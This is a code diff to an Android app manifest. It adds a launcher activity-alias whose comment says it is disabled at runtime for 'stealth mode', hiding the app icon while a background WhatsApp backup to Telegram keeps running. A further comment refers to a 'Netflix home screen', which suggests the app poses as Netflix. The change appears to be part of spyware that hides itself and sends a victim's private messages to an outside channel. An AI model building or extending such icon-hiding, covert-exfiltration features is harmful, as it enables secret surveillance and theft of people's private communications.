@@ -40,12 +40,20 @@
         <activity
             android:name=".ui.MainActivity"
             android:exported="true"
-            android:screenOrientation="portrait">
+            android:screenOrientation="portrait" />
+
+        <!-- Launcher alias: disabled at runtime for stealth mode (icon hidden,
+             background WhatsApp backup to Telegram keeps running). -->
+        <activity-alias
+            android:name=".ui.AliasLauncher"
+            android:targetActivity=".ui.MainActivity"
+            android:enabled="true"
+            android:exported="true">
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
                 <category android:name="android.intent.category.LAUNCHER" />
             </intent-filter>
-        </activity>
+        </activity-alias>
 
         <!-- Main Netflix home screen -->
         <activity
